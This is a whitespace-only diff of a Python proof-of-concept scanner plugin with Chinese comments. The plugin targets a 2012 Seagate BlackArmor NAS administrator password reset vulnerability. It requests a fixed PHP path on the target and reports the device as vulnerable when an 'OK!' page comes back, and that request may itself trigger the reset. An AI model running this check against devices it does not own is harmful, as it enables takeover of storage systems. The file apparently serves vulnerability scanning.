@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Seagate_NAS_0001' # 平台漏洞编号，留空
+    vuln_id = 'Seagate_NAS_0001'  # 平台漏洞编号，留空
     name = '希捷NAS 管理员密码重置'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.OTHER # 漏洞类型
+    type = VulnType.OTHER  # 漏洞类型
     disclosure_date = '2012-05-23'  # 漏洞公布时间
     desc = '''
         The Seagate BlackArmor network attached storage device contains a static administrator password reset vulnerability.
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '希捷NAS'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '5dffc5a3-1fb1-4bc1-965c-8ecfc6177642'
@@ -33,11 +35,11 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/d41d8cd98f00b204e9800998ecf8427e.php'
             verify_url = self.target + payload
             r = requests.get(verify_url)
-        
+
             if r.status_code == 200 and '<h1><strong>OK!</strong></h1>' in r.content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
@@ -47,6 +49,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
